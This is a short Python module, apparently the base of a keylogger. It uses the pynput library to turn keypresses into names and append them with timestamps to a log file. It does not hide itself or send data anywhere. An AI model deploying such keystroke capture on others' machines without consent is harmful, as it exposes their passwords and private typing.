# keypresses_base.py

from pynput import keyboard
import time  # Don't forget to import the time module

# Mapping of key codes to their corresponding names
key_code_mapping = {
    "[SPACE]": " ",
    "[ENTER]": "[ENTER]",
    "[CTRL]": "[CTRL]"
    # Add more mappings for other special keys as needed
}

# Function to convert key codes to their corresponding names
def convert_key_code(key_code):
    return key_code_mapping.get(key_code, key_code)

# Function to handle key presses
def on_key_press(log_file, key):  # Accept log_file and key as arguments
    try:
        key_name = convert_key_code(str(key))
        log_key_press(log_file, key_name)  # Pass both log_file and key_name as arguments

    except Exception as e:
        print("Error writing to file:", e)

# Function to log key presses
def log_key_press(log_file, key_name):  # Accept log_file and key_name as arguments
    try:
        # Open the log file in append mode
        with open(log_file, 'a') as f:
            # Write the timestamp and the key pressed to the file
            f.write(f'{time.strftime("%Y-%m-%d %H:%M:%S")} - {key_name}\n')
    except Exception as e:
        # Print an error message if writing to the file fails
        print("Error writing to file:", e)
